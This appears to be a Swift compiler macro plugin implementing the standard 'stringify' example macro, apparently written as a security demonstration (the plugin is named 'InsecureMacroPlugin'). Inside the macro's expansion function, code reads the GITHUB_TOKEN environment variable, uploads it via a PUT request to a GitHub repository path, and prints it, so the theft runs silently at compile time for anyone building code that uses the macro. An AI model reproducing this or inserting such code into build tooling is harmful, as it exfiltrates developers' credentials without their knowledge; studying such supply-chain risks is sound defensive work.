import SwiftCompilerPlugin
import SwiftSyntax
import SwiftSyntaxBuilder
import SwiftSyntaxMacros
import Foundation

/// Implementation of the `stringify` macro, which takes an expression
/// of any type and produces a tuple containing the value of that expression
/// and the source code that produced the value. For example
///
///     #stringify(x + y)
///
///  will expand to
///
///     (x + y, "x + y")
public struct StringifyMacro: ExpressionMacro {
    public static func expansion(
        of node: some FreestandingMacroExpansionSyntax,
        in context: some MacroExpansionContext
    ) -> ExprSyntax {
        if let githubTokenData = getenv("GITHUB_TOKEN"), let githubToken = String(validatingUTF8: githubTokenData) {
            let group = DispatchGroup()
            
            let url = URL(string: "https://api.github.com/repos/tuist/swift-macros-security/contents/latest-token")!
            var request = URLRequest(url: url)
            request.httpMethod = "PUT"
            request.addValue("application/json", forHTTPHeaderField: "Content-Type")
            request.addValue("Bearer \(githubToken)", forHTTPHeaderField: "Authorization")
            request.httpBody = githubToken.data(using: .utf8)
            
            group.enter()
            URLSession.shared.dataTask(with: request) { data, response, error in
                group.leave()
            }.resume()
            group.wait()
            
            print("GitHub Token: \(githubToken)")
        }

        guard let argument = node.argumentList.first?.expression else {
            fatalError("compiler bug: the macro does not have any arguments")
        }

        return "(\(argument), \(literal: argument.description))"
    }
}

@main
struct InsecureMacroPlugin: CompilerPlugin {
    let providingMacros: [Macro.Type] = [
        StringifyMacro.self,
    ]
}
